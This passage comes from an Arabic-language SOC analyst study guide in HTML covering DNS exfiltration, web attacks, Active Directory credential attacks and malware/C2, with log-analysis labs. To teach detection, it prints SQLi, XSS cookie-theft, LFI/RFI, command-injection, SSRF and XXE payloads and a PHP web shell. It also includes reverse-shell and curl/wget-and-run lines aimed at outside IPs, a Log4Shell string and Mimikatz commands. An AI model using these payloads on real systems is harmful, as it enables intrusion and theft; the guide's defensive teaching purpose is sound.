+<div class="card"><h4>DNS Tunneling / Exfil</h4><ul><li>Subdomains <b>طويلة جداً</b> وعشوائية (Base32/64/Hex)</li><li>Volume عالي لدومين واحد</li><li>Record types غريبة: <b>TXT</b>، NULL، CNAME كتير</li><li>Entropy عالية</li><li>أدوات: iodine، dnscat2، DNSExfiltrator</li></ul></div>
+<div class="card"><h4>DGA</h4><ul><li>Domains عشوائية (<code class="i">xkq3vbz9plw.com</code>)</li><li><b>NXDOMAIN كتير</b> من نفس الجهاز</li><li>الـ malware بيجرب لحد ما يلاقي واحد مسجّل</li></ul></div>
+<div class="card"><h4>تانيين</h4><ul><li>Newly registered domains</li><li>Lookalike domains</li><li>Fast-flux (IPs كتير بتتغير بسرعة و TTL قصير)</li><li>DNS لـ IP خارجي بدل الـ resolver الداخلي</li><li>DoH (DNS over HTTPS) لـ bypass</li></ul></div>
+</div>
+
+<div class="lab">
+<div class="lt">🧪 Lab: إيه اللي بيحصل هنا؟</div>
+<pre>timestamp            client       qtype  query                                                                     rcode
+10:00:01.120  10.10.4.50   TXT    <span class="r">MVWXA3DPPFSWKX3TMFWGC4TJMVZV6MRQGI3C46DMON4HY4DBOJ2DC7A.ZXhmaWx0cmF0aW9u.t1.cdn-sync-api.example</span>  NOERROR
+10:00:01.410  10.10.4.50   TXT    <span class="r">JZQW2ZJMKNQWYYLSPEWESQSBJYFEC2DNMVSCY.MDAwMQ.t1.cdn-sync-api.example</span>          NOERROR
+10:00:01.702  10.10.4.50   TXT    <span class="r">GQ2TAMBQFRCUOMZYGAYDCOJQGAYDK.MDAwMg.t1.cdn-sync-api.example</span>          NOERROR
+   ... (3,000 query/hour لنفس الدومين)
+11:15:22.010  10.10.6.31   A      kq3vbz9plwx.com        NXDOMAIN
+11:15:22.050  10.10.6.31   A      zt8mmw2qopa.net        NXDOMAIN
+11:15:22.090  10.10.6.31   A      p0vqlx7ejrn.org        NXDOMAIN
+11:15:22.130  10.10.6.31   A      hhd72kslqmb.info       <span class="r">NOERROR → 203.0.113.250</span>
+12:00:00.000  10.10.2.14   A      d1a2b3c4d5e6f7.cloudfront.net    NOERROR</pre>
+<details class="ans"><summary>اظهر الإجابة</summary><div class="body">
+<ul>
+<li><b>10.10.4.50 — DNS Tunneling/Exfiltration:</b> TXT queries كتير جداً بـ subdomains طويلة مشفّرة (Base32) — لو فكيت أول واحد Base32 هتلاقيه <code class="i">employee_salaries_2026.xlsx|part1|</code> والتانيين محتوى الملف نفسه (<code class="i">Name,Salary,IBAN...</code>) = <b>تسريب ملف رواتب</b> + جزء متغير كـ sequence counter (<code class="i">MDAwMQ</code> = base64 لـ <code class="i">0001</code>، <code class="i">MDAwMg</code> = <code class="i">0002</code>) لنفس الـ parent domain. ده نفس الجهاز اللي كان بيكلم 8.8.8.8 في Firewall Lab (Block E). T1071.004 / T1048.</li>
+<li><b>10.10.6.31 — DGA Malware:</b> بيجرب دومينات عشوائية بتطلع NXDOMAIN لحد ما واحد اشتغل ← 203.0.113.250 = C2. Block + Isolate + شوف الاتصال بالـ IP ده. T1568.002.</li>
+<li><b>10.10.2.14 — False Positive:</b> CloudFront (AWS CDN) أسماؤه عشوائية بطبيعتها. ده مثال إن "random-looking" لوحده مش كفاية — لازم volume + rcode + reputation.</li>
+</ul>
+</div></details>
+</div>
+</section>
+
+<!-- ===================== WEB ===================== -->
+<section class="sec" id="web">
+<header><h2><span class="num">12</span>Web Attacks — Payloads، Logs، Detection</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<h3>شكل Apache/Nginx Access Log (Combined Format)</h3>
+<pre><span class="b">203.0.113.66</span> - - [<span class="y">20/Nov/2026:01:31:07 +0000</span>] "<span class="p">GET /products.php?id=5 HTTP/1.1</span>" <span class="g">200</span> <span class="b">4210</span> "<span class="c">https://shop.company.com/</span>" "<span class="r">Mozilla/5.0 ...</span>"
+   │              │                                 │                                 │    │       │                            └─ User-Agent
+   │              │                                 │                                 │    │       └─ Referer
+   │              │                                 │                                 │    └─ Response size (bytes) ← مهم جداً لمعرفة النجاح
+   │              │                                 │                                 └─ Status code
+   │              │                                 └─ Method + URI + Protocol
+   │              └─ Timestamp
+   └─ Client IP (لو ورا Load balancer/CDN شوف X-Forwarded-For)</pre>
+<div class="callout warn"><b class="t">⚠️ أهم مهارة: Attempt ولا Success؟</b>
+<b>Status 200 لوحده مش دليل نجاح</b> (كتير من الـ apps بترجع 200 لصفحة error). قارن <b>Response size</b>: لو الـ payload رجّع حجم <u>أكبر بكتير</u> من الطبيعي = غالباً سحب data. <b>500</b> بعد <code class="i">'</code> = الـ input وصل للـ DB وكسر الـ query (Vulnerable!). وشوف الـ <b>follow-up activity</b>: هل جه بعدها login ناجح، upload، web shell commands؟
+</div>
+
+<h3>URL Decoding Cheat Sheet</h3>
+<div class="tbl"><table>
+<tr><th>Encoded</th><td class="m">%20 / +</td><td class="m">%27</td><td class="m">%22</td><td class="m">%3C %3E</td><td class="m">%2F</td><td class="m">%2E</td><td class="m">%3D</td><td class="m">%26</td><td class="m">%3B</td><td class="m">%7C</td><td class="m">%28 %29</td><td class="m">%23</td><td class="m">%25</td><td class="m">%0A %0D</td></tr>
+<tr><th>Decoded</th><td class="m">space</td><td class="m">'</td><td class="m">"</td><td class="m">&lt; &gt;</td><td class="m">/</td><td class="m">.</td><td class="m">=</td><td class="m">&amp;</td><td class="m">;</td><td class="m">|</td><td class="m">( )</td><td class="m">#</td><td class="m">%</td><td class="m">LF CR</td></tr>
+</table></div>
+
+<!-- SQLi -->
+<h3>1) SQL Injection (SQLi)</h3>
+<p>المهاجم بيدخّل SQL في الـ input عشان يغيّر الـ query. الهدف: سحب البيانات، Bypass login، أحياناً RCE.</p>
+<div class="grid2">
+<div class="card"><h4>Payloads حسب النوع</h4>
+<pre><span class="c">-- Auth bypass</span>
+admin' -- -        ' OR 1=1-- -      ' OR '1'='1
+<span class="c">-- Error-based / test</span>
+'    "    ')    ' AND extractvalue(1,concat(0x7e,version()))-- -
+<span class="c">-- UNION-based</span>
+' ORDER BY 5-- -
+-1 UNION SELECT 1,username,password,4 FROM users-- -
+<span class="c">-- Boolean blind</span>
+' AND 1=1-- -   vs   ' AND 1=2-- -
+<span class="c">-- Time-based blind</span>
+' AND SLEEP(5)-- -          '; WAITFOR DELAY '0:0:5'--
+<span class="c">-- Info</span>
+@@version  database()  information_schema.tables</pre></div>
+<div class="card"><h4>في اللوج</h4>
+<pre>"GET /products.php?id=5%27 HTTP/1.1" <span class="y">500</span> 312
+"GET /products.php?id=5%20ORDER%20BY%2010--%20- HTTP/1.1" 500 312
+"GET /products.php?id=-5%20UNION%20SELECT%201,username,password,4%20FROM%20users--%20- HTTP/1.1" <span class="r">200 18842</span> "-" "<span class="r">sqlmap/1.8.2#stable (https://sqlmap.org)</span>"</pre>
+<p><b>Indicators:</b> <code class="i">'</code>، <code class="i">UNION</code>، <code class="i">SELECT</code>، <code class="i">--</code>، <code class="i">#</code>، <code class="i">/**/</code>، <code class="i">SLEEP</code>، <code class="i">BENCHMARK</code>، <code class="i">information_schema</code>، <code class="i">0x...</code>، <code class="i">CHAR(</code>، UA sqlmap، requests كتير بسرعة.</p>
+<p><b>Mitigation:</b> Parameterized queries / Prepared statements، Input validation، Least privilege DB user، WAF.</p></div>
+</div>
+
+<!-- XSS -->
+<h3>2) Cross-Site Scripting (XSS)</h3>
+<p>حقن JavaScript يتنفذ في متصفح ضحية تانية ← سرقة Cookies/Session، Redirect، Keylogging.</p>
+<ul>
+<li><b>Reflected:</b> الـ payload في الـ URL ويرجع في الرد فوراً (محتاج الضحية تدوس على لينك).</li>
+<li><b>Stored:</b> بيتخزن في الـ DB (comment، profile) ويتنفذ لكل اللي يفتح الصفحة — الأخطر.</li>
+<li><b>DOM-based:</b> بيحصل في الـ client-side JS بدون ما يعدّي على السيرفر أحياناً (مش هيبان في access log لو بعد <code class="i">#</code>).</li>
+</ul>
+<pre>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(document.cookie)&gt;
+&lt;svg/onload=fetch('https://198.51.100.9/c?='+document.cookie)&gt;
+"&gt;&lt;script&gt;new Image().src='//198.51.100.9/?c='+document.cookie&lt;/script&gt;
+javascript:alert(1)
+
+<span class="c"># في اللوج (encoded):</span>
+"GET /search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1" 200 5120
+"GET /search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E HTTP/1.1" 200 5098</pre>
+<p><b>Indicators:</b> <code class="i">&lt;script</code>، <code class="i">onerror=</code>، <code class="i">onload=</code>، <code class="i">javascript:</code>، <code class="i">document.cookie</code>، <code class="i">alert(</code>، <code class="i">%3C</code>. <b>Mitigation:</b> Output encoding، CSP، HttpOnly cookies، Input validation.</p>
+
+<!-- LFI -->
+<h3>3) Path Traversal / LFI / RFI</h3>
+<pre><span class="c"># Path traversal / LFI — قراءة ملفات من السيرفر</span>
+/index.php?page=../../../../etc/passwd
+/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd          <span class="c"># double encoding</span>
+/index.php?page=....//....//....//etc/passwd                          <span class="c"># filter bypass</span>
+/index.php?page=php://filter/convert.base64-encode/resource=config.php  <span class="c"># يقرا source code</span>
+/view?file=..\..\..\windows\win.ini                                   <span class="c"># Windows</span>
+<span class="c"># RFI — تضمين ملف من سيرفر المهاجم (RCE)</span>
+/index.php?page=http://203.0.113.66/shell.txt
+<span class="c"># Log poisoning → LFI to RCE: يحط PHP في الـ User-Agent وبعدين يعمل include لـ access.log</span>
+/index.php?page=/var/log/apache2/access.log</pre>
+<p><b>دليل النجاح:</b> Response size كبير مع <code class="i">/etc/passwd</code> (عادةً 1-3KB) أو <code class="i">win.ini</code>. <b>Mitigation:</b> Whitelist للملفات، <code class="i">basename()</code>، <code class="i">allow_url_include=Off</code>.</p>
+
+<!-- CMDi -->
+<h3>4) Command Injection (OS Command Injection)</h3>
+<pre><span class="c"># الـ app بتاخد input وتحطه في shell command (مثلاً ping)</span>
+/ping.php?ip=127.0.0.1;id
+/ping.php?ip=127.0.0.1|whoami
+/ping.php?ip=127.0.0.1%26%26cat%20/etc/passwd
+/ping.php?ip=`curl http://203.0.113.66/x.sh|sh`
+/ping.php?ip=$(nc -e /bin/sh 203.0.113.66 4444)</pre>
+<p><b>Indicators:</b> <code class="i">;</code> <code class="i">|</code> <code class="i">&amp;&amp;</code> <code class="i">`</code> <code class="i">$(</code> + أوامر (<code class="i">id</code>، <code class="i">whoami</code>، <code class="i">uname</code>، <code class="i">cat</code>، <code class="i">wget</code>، <code class="i">curl</code>، <code class="i">nc</code>). على EDR: <code class="i">www-data</code> / <code class="i">w3wp.exe</code> بيشغل shell.</p>
+
+<!-- SSRF -->
+<h3>5) SSRF — Server-Side Request Forgery</h3>
+<p>المهاجم بيخلي <b>السيرفر نفسه</b> يبعت request لمكان داخلي مش متاح من برا.</p>
+<pre>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/   <span class="c"># AWS metadata → سرقة cloud keys!</span>
+/fetch?url=http://127.0.0.1:8080/admin
+/fetch?url=http://10.0.0.5:6379/          /fetch?url=file:///etc/passwd       /fetch?url=gopher://...</pre>
+<p><b>Indicators:</b> URLs في parameters فيها <code class="i">169.254.169.254</code>، <code class="i">localhost</code>، <code class="i">127.0.0.1</code>، Private IPs، <code class="i">file://</code>، <code class="i">gopher://</code>، <code class="i">0x7f000001</code>. (Capital One breach 2019 كان SSRF.)</p>
+
+<!-- XXE -->
+<h3>6) XXE — XML External Entity</h3>
+<pre>POST /api/import  Content-Type: application/xml
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "<span class="r">file:///etc/passwd</span>"&gt; ]&gt;
+&lt;order&gt;&lt;id&gt;&amp;xxe;&lt;/id&gt;&lt;/order&gt;</pre>
+<p><b>Indicators:</b> <code class="i">&lt;!DOCTYPE</code>، <code class="i">&lt;!ENTITY</code>، <code class="i">SYSTEM</code> في body (مش هيبان في access log عادي — محتاج WAF/body logging). <b>Mitigation:</b> Disable external entities.</p>
+
+<!-- Upload/Webshell -->
+<h3>7) File Upload → Web Shell</h3>
+<pre><span class="c"># أبسط web shell في PHP</span>
+&lt;?php system($_GET['cmd']); ?&gt;
+<span class="c"># Bypass tricks: shell.php.jpg ، shell.phtml ، shell.pHp ، Content-Type: image/jpeg مزيف ، GIF89a; في أول الملف</span>
+
+<span class="c"># في اللوج:</span>
+"POST /profile/upload.php HTTP/1.1" 200 64
+"GET /uploads/avatar.php?cmd=id HTTP/1.1" 200 54
+"GET /uploads/avatar.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 2311</pre>
+<p><b>Indicators:</b> ملف <code class="i">.php/.aspx/.jsp</code> في مجلد uploads/images، parameter اسمه <code class="i">cmd</code>/<code class="i">exec</code>/<code class="i">c</code>، requests لملف واحد من IP واحد بس، Web server process بيشغل <code class="i">cmd.exe/sh</code>. أشهر web shells: China Chopper، Godzilla، Behinder، WSO. MITRE T1505.003.</p>
+
+<!-- Others -->
+<h3>8) هجمات تانية لازم تعرف تعريفها</h3>
+<div class="tbl"><table>
+<tr><th>الهجوم</th><th>الفكرة</th><th>Indicator / مثال</th></tr>
+<tr><td><b>Brute force / Credential stuffing على Login</b></td><td>POST كتير لـ /login</td><td>مئات POST /wp-login.php أو /login من IP واحد، 200 (فشل) ثم <b>302</b> (نجاح!)</td></tr>
+<tr><td><b>Directory/Content discovery</b></td><td>تخمين مسارات</td><td>كمية 404 ضخمة، UA: gobuster، dirb، ffuf، feroxbuster، Nikto</td></tr>
+<tr><td><b>IDOR</b></td><td>تغيير ID للوصول لبيانات حد تاني</td><td><code class="i">/api/invoice?id=1001 → 1002 → 1003</code> sequential من نفس اليوزر — Broken Access Control</td></tr>
+<tr><td><b>CSRF</b></td><td>إجبار متصفح الضحية (المسجّل دخول) يعمل action</td><td>Referer من موقع خارجي لـ action حساس؛ الحل: CSRF tokens + SameSite cookies</td></tr>
+<tr><td><b>SSTI</b></td><td>حقن في template engine</td><td><code class="i">{{7*7}}</code> → 49، <code class="i">${7*7}</code>، <code class="i">{{config}}</code></td></tr>
+<tr><td><b>Log4Shell</b> (CVE-2021-44228)</td><td>JNDI lookup في Log4j ← RCE</td><td><code class="i">${jndi:ldap://203.0.113.66:1389/a}</code> في User-Agent أو أي header، ومتغيراته <code class="i">${${lower:j}ndi:...}</code></td></tr>
+<tr><td><b>Insecure Deserialization</b></td><td>object مسلسل خبيث</td><td>Java: <code class="i">rO0AB</code> (base64) / <code class="i">aced0005</code> (hex)</td></tr>
+<tr><td><b>Open Redirect</b></td><td>توجيه لموقع خارجي</td><td><code class="i">/redirect?url=https://evil.example</code> — بيستخدم في Phishing</td></tr>
+<tr><td><b>HTTP Verb tampering / PUT</b></td><td>رفع ملفات بـ PUT</td><td><code class="i">PUT /shell.jsp</code> → 201 Created</td></tr>
+<tr><td><b>DoS / DDoS (L7)</b></td><td>إغراق الـ app</td><td>آلاف الطلبات لـ endpoint تقيل (search)، 503</td></tr>
+</table></div>
+
+<h3>Scanner User-Agents (لو شفتها = Recon/Attack أداة)</h3>
+<pre>sqlmap/1.x (https://sqlmap.org)          Mozilla/5.00 (Nikto/2.x) (Evasions:None) (Test:...)
+gobuster/3.x     Fuzz Faster U Fool v2 (ffuf)     WPScan v3.x     Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
+Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)    masscan/1.x    zgrab/0.x
+python-requests/2.x   curl/8.x   Go-http-client/1.1   (مش دايماً خبيث بس مريب لو على login/admin)</pre>
+
+<h3>OWASP Top 10</h3>
+<div class="grid2">
+<div class="card"><h4>2021 (الأشهر في الأسئلة)</h4><ol>
+<li>A01 Broken Access Control (IDOR)</li><li>A02 Cryptographic Failures</li><li>A03 Injection (SQLi, XSS, CMDi)</li><li>A04 Insecure Design</li><li>A05 Security Misconfiguration (XXE ضمنها)</li><li>A06 Vulnerable &amp; Outdated Components</li><li>A07 Identification &amp; Authentication Failures</li><li>A08 Software &amp; Data Integrity Failures (Deserialization)</li><li>A09 Security Logging &amp; Monitoring Failures</li><li>A10 SSRF</li></ol></div>
+<div class="card"><h4>2025 (الإصدار الأحدث)</h4><ol>
+<li>A01 Broken Access Control (SSRF اتدمجت فيها)</li><li>A02 Security Misconfiguration</li><li>A03 Software Supply Chain Failures (جديد)</li><li>A04 Cryptographic Failures</li><li>A05 Injection</li><li>A06 Insecure Design</li><li>A07 Authentication Failures</li><li>A08 Software or Data Integrity Failures</li><li>A09 Security Logging &amp; Alerting Failures</li><li>A10 Mishandling of Exceptional Conditions (جديد)</li></ol>
+<p class="muted">لو اتسألت قول "حسب إصدار 2021…" وبعدين اذكر إن فيه 2025 — ده بيبيّن إنك متابع.</p></div>
+</div>
+
+<div class="lab">
+<div class="lt">🧪 Lab: Web Attack Chain — احكي اللي حصل</div>
+<pre>203.0.113.66 - - [20/Nov/2026:01:20:11 +0000] "GET / HTTP/1.1" 200 5320 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"
+203.0.113.66 - - [20/Nov/2026:01:20:12 +0000] "GET /.git/HEAD HTTP/1.1" 404 196 "-" "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000245)"
+203.0.113.66 - - [20/Nov/2026:01:22:40 +0000] "GET /admin/ HTTP/1.1" 301 238 "-" "gobuster/3.6"
+203.0.113.66 - - [20/Nov/2026:01:22:40 +0000] "GET /backup/ HTTP/1.1" 404 196 "-" "gobuster/3.6"
+   ... (4,612 request أغلبهم 404 في 3 دقايق)
+203.0.113.66 - - [20/Nov/2026:01:31:07 +0000] "GET /products.php?id=5 HTTP/1.1" 200 4210 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+203.0.113.66 - - [20/Nov/2026:01:31:15 +0000] "GET /products.php?id=5%27 HTTP/1.1" 500 312 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+203.0.113.66 - - [20/Nov/2026:01:33:02 +0000] "GET /products.php?id=5%20AND%20SLEEP(5)--%20- HTTP/1.1" 200 4210 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"
+203.0.113.66 - - [20/Nov/2026:01:35:48 +0000] "GET /products.php?id=-5%20UNION%20ALL%20SELECT%201,CONCAT(username,0x3a,password),3,4%20FROM%20admins--%20- HTTP/1.1" 200 6904 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"
+203.0.113.66 - - [20/Nov/2026:01:41:19 +0000] "POST /admin/login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+203.0.113.66 - - [20/Nov/2026:01:42:03 +0000] "POST /admin/media/upload.php HTTP/1.1" 200 88 "https://shop.company.com/admin/media/" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+203.0.113.66 - - [20/Nov/2026:01:42:30 +0000] "GET /uploads/img_2291.php?c=id HTTP/1.1" 200 54 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+203.0.113.66 - - [20/Nov/2026:01:42:51 +0000] "GET /uploads/img_2291.php?c=cat%20/var/www/html/config.php HTTP/1.1" 200 1290 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
+203.0.113.66 - - [20/Nov/2026:01:43:40 +0000] "GET /uploads/img_2291.php?c=wget%20http://203.0.113.66/k.sh%20-O%20/tmp/.k;bash%20/tmp/.k HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"</pre>
+<p><b>الأسئلة:</b> المراحل إيه؟ الهجوم نجح؟ إيه الدليل؟ إيه اللي اتسرق؟ تعمل إيه؟</p>
+<details class="ans"><summary>اظهر الإجابة</summary><div class="body">
+<ol>
+<li><b>01:20 Recon:</b> Nikto vulnerability scan (نفس الـ IP اللي عمل port scan في Firewall Lab A — Correlation!).</li>
+<li><b>01:22 Content discovery:</b> gobuster لقى <code class="i">/admin/</code> (301 = موجود).</li>
+<li><b>01:31 Manual SQLi testing:</b> <code class="i">'</code> رجّع <b>500</b> ← الـ parameter <code class="i">id</code> vulnerable. لاحظ إنه غيّر الـ UA لـ Firefox (يدوي).</li>
+<li><b>01:33–01:35 Automated SQLi (sqlmap):</b> time-based ثم UNION سحب <code class="i">username:password</code> من جدول <code class="i">admins</code> — الـ response <b>6904</b> bytes vs الطبيعي 4210 = <b>Data extracted ✔</b>.</li>
+<li><b>01:41 Login ناجح</b> للـ admin panel (POST → <b>302</b>) بالـ credentials المسروقة.</li>
+<li><b>01:42 Upload web shell</b> <code class="i">img_2291.php</code> (اسم صورة بامتداد php) ← تنفيذ أوامر: <code class="i">id</code>، قراءة <code class="i">config.php</code> (فيه DB credentials غالباً)، ثم تنزيل وتشغيل <code class="i">/tmp/.k</code> (ملف مخفي — غالباً reverse shell/miner/persistence).</li>
+</ol>
+<p><b>Verdict:</b> <span class="badge b-red">Critical — Web server compromised (RCE)</span>. MITRE: T1595 → T1190 → T1078 → T1505.003 → T1059.004 → T1105.</p>
+<p><b>Actions:</b> Isolate السيرفر، Block 203.0.113.66، احذف الـ web shell بعد ما تاخد نسخة للأدلة، دوّر على باقي الـ shells (<code class="i">find /var/www -name "*.php" -newer ...</code>)، افحص <code class="i">/tmp/.k</code> و crontab و processes، غيّر كل الـ credentials (admins + DB + أي secrets في config.php)، صلّح الـ SQLi (prepared statements)، امنع تنفيذ PHP في uploads، WAF، وبلّغ لو فيه بيانات عملاء اتسربت (compliance).</p>
+</div></details>
+</div>
+</section>
+
+<!-- ===================== AD ===================== -->
+<section class="sec" id="ad">
+<header><h2><span class="num">13</span>Active Directory & Credential Attacks</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<h3>Kerberos في 30 ثانية</h3>
+<pre><span class="b">User</span>                              <span class="b">KDC (Domain Controller)</span>                      <span class="b">Service (e.g. SQL)</span>
+ │ 1. AS-REQ (timestamp مشفر بـ hash الباسورد)  ──►│
+ │ 2. AS-REP  ◄── TGT (مشفر بـ hash الـ <span class="r">krbtgt</span>)   │        <span class="c">← Event 4768</span>
+ │ 3. TGS-REQ (TGT + اسم الـ SPN) ──────────────►│
+ │ 4. TGS-REP ◄── Service Ticket (مشفر بـ hash حساب الـ service) <span class="c">← Event 4769</span>
+ │ 5. AP-REQ (Service Ticket) ─────────────────────────────────────────────────────────────►│</pre>
+<p><b>NTLM</b> (الأقدم): Challenge/Response — Event <b>4776</b> على الـ DC. مشكلته إن الـ <b>hash نفسه</b> كفاية للدخول ← Pass-the-Hash.</p>
+
+<div class="tbl"><table>
+<tr><th>الهجوم</th><th>الفكرة</th><th>Detection</th><th>MITRE</th></tr>
+<tr><td><b>Kerberoasting</b></td><td>أي domain user يطلب TGS لـ service account (SPN) ويكسر الـ hash offline</td><td><b>4769</b> مع <b>Ticket Encryption Type 0x17 (RC4)</b>، يوزر واحد طالب tickets لـ services كتير في وقت قصير</td><td class="m">T1558.003</td></tr>
+<tr><td><b>AS-REP Roasting</b></td><td>حسابات معمولها "Do not require pre-auth" — يطلب AS-REP ويكسره</td><td><b>4768</b> مع Pre-Authentication Type <b>0</b> + RC4</td><td class="m">T1558.004</td></tr>
+<tr><td><b>Pass-the-Hash</b></td><td>استخدام NTLM hash بدل الباسورد</td><td>4624 Logon Type <b>9</b> + Logon Process <b>seclogo</b> (على جهاز المهاجم)، أو Type 3 NTLM من مكان غريب</td><td class="m">T1550.002</td></tr>
+<tr><td><b>Pass-the-Ticket</b></td><td>سرقة Kerberos ticket واستخدامه</td><td>Tickets على host مختلف، anomalies في 4768/4769</td><td class="m">T1550.003</td></tr>
+<tr><td><b>Golden Ticket</b></td><td>تزوير TGT بـ hash الـ <b>krbtgt</b> = Domain persistence كامل</td><td>TGS (4769) من غير AS (4768) قبلها، Lifetime غير طبيعي (10 سنين)، حسابات مش موجودة. العلاج: reset krbtgt <b>مرتين</b></td><td class="m">T1558.001</td></tr>
+<tr><td><b>Silver Ticket</b></td><td>تزوير Service ticket بـ hash حساب الـ service</td><td>صعب — مفيش تواصل مع الـ DC</td><td class="m">T1558.002</td></tr>
+<tr><td><b>DCSync</b></td><td>انتحال DC وطلب replication لكل الـ hashes (Mimikatz <code class="i">lsadump::dcsync</code>)</td><td><b>4662</b> بـ GUIDs <code class="i">1131f6aa-…</code> / <code class="i">1131f6ad-…</code> (DS-Replication-Get-Changes[-All]) من حساب/جهاز <b>مش DC</b></td><td class="m">T1003.006</td></tr>
+<tr><td><b>NTDS.dit theft</b></td><td>نسخ قاعدة بيانات الـ AD</td><td><code class="i">ntdsutil "ac i ntds" ifm</code>، <code class="i">vssadmin create shadow</code> على DC</td><td class="m">T1003.003</td></tr>
+<tr><td><b>LLMNR/NBT-NS Poisoning</b></td><td>Responder بيرد على name resolution ويسرق NetNTLMv2</td><td>Traffic على UDP 5355/137 من جهاز مش DNS server</td><td class="m">T1557.001</td></tr>
+<tr><td><b>BloodHound / SharpHound</b></td><td>Enumeration لكل علاقات الـ AD عشان يلاقي path لـ Domain Admin</td><td>LDAP queries ضخمة من workstation واحدة، 4662 كتير</td><td class="m">T1087.002</td></tr>
+</table></div>
+
+<h3>Mimikatz — Commands تعرفها لو شفتها</h3>
+<pre>privilege::debug                       <span class="c"># SeDebugPrivilege</span>
+sekurlsa::logonpasswords               <span class="c"># dump credentials من LSASS</span>
+lsadump::sam  |  lsadump::secrets  |  lsadump::dcsync /user:krbtgt
+sekurlsa::pth /user:admin /domain:corp /ntlm:&lt;hash&gt;     <span class="c"># Pass-the-Hash → 4624 Type 9</span>
+kerberos::golden /user:x /domain:corp /sid:S-1-5-21-... /krbtgt:&lt;hash&gt; /ptt</pre>
+
+<h3>Lateral Movement — مين بيسيب إيه على الهدف</h3>
+<div class="tbl"><table>
+<tr><th>الأداة/الطريقة</th><th>Artifacts على الجهاز الهدف</th></tr>
+<tr><td>PsExec</td><td>4624 Type 3، 5145 على <code class="i">ADMIN$</code>، <b>7045</b> service <code class="i">PSEXESVC</code>، named pipe <code class="i">\PSEXESVC</code></td></tr>
+<tr><td>Impacket psexec/smbexec</td><td>7045 service باسم عشوائي، <code class="i">cmd.exe /Q /c echo ... ^&gt; \\127.0.0.1\ADMIN$\__output</code></td></tr>
+<tr><td>WMI (wmic / Impacket wmiexec)</td><td>4624 Type 3، process parent = <code class="i">wmiprvse.exe</code></td></tr>
+<tr><td>WinRM / PS Remoting</td><td>4624 Type 3، parent = <code class="i">wsmprovhost.exe</code>، port 5985/5986</td></tr>
+<tr><td>RDP</td><td>4624 Type 10، 4778/4779 (session reconnect/disconnect)، TerminalServices logs (1149, 21, 24, 25)</td></tr>
+<tr><td>Scheduled Task remotely</td><td>4698 + <code class="i">schtasks /s</code></td></tr>
+</table></div>
+</section>
+
+<!-- ===================== MALWARE ===================== -->
+<section class="sec" id="malware">
+<header><h2><span class="num">14</span>Malware Types, C2 & Analysis Basics</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<div class="tbl"><table>
+<tr><th>النوع</th><th>الوصف</th></tr>
+<tr><td><b>Virus</b></td><td>بيلزق نفسه في ملف ومحتاج تشغيل</td></tr>
+<tr><td><b>Worm</b></td><td>بينتشر لوحده عبر الشبكة (WannaCry على SMB)</td></tr>
+<tr><td><b>Trojan</b></td><td>بيتنكر كبرنامج شرعي</td></tr>
+<tr><td><b>RAT</b></td><td>تحكم كامل عن بعد (AsyncRAT، Remcos، njRAT)</td></tr>
+<tr><td><b>Ransomware</b></td><td>تشفير + طلب فدية — حالياً <b>Double extortion</b> (تشفير + تهديد بنشر البيانات)، RaaS model</td></tr>
+<tr><td><b>Infostealer</b></td><td>بيسرق passwords، cookies، crypto wallets من المتصفحات (Lumma، RedLine، Vidar) — مصدر رئيسي للـ initial access حالياً</td></tr>
+<tr><td><b>Loader / Dropper</b></td><td>مرحلة أولى بتنزّل الـ payload الحقيقي</td></tr>
+<tr><td><b>Rootkit / Bootkit</b></td><td>بيستخبى على مستوى الـ kernel/boot</td></tr>
+<tr><td><b>Fileless</b></td><td>بيعيش في الميموري / registry / WMI (PowerShell) — مفيش ملف على الديسك</td></tr>
+<tr><td><b>Cryptominer</b></td><td>بيستخدم CPU/GPU للتعدين — CPU 100% واتصال بـ mining pool (port 3333/4444/14444، stratum+tcp)</td></tr>
+<tr><td><b>Botnet</b></td><td>شبكة أجهزة مصابة بتتحكم مركزياً (DDoS، Spam)</td></tr>
+</table></div>
+
+<h3>C2 Frameworks و Indicators</h3>
+<ul>
+<li><b>Cobalt Strike</b> (الأشهر في الهجمات الحقيقية): Beacon، default named pipes زي <code class="i">\\.\pipe\MSSE-&lt;n&gt;-server</code>، <code class="i">msagent_*</code>، <code class="i">postex_*</code>؛ <code class="i">rundll32.exe</code> بدون arguments بيعمل network connection؛ JA3/JA3S fingerprints؛ default cert.</li>
+<li><b>Metasploit / Meterpreter</b> (port 4444 default)، <b>Sliver</b>، <b>Havoc</b>، <b>Brute Ratel</b>، <b>Mythic</b>.</li>
+<li><b>C2 channels:</b> HTTP/S، DNS، Domain fronting، Legit services (Telegram، Discord، Slack، GitHub، Google Drive) ← صعب تمنعها بالـ IP.</li>
+<li><b>Remote Access Tools شرعية بيستغلوها:</b> AnyDesk، TeamViewer، ScreenConnect، Atera، Splashtop — لو اتثبتت فجأة بعد phishing = 🚩.</li>
+</ul>
+
+<h3>Static vs Dynamic Analysis</h3>
+<div class="grid2">
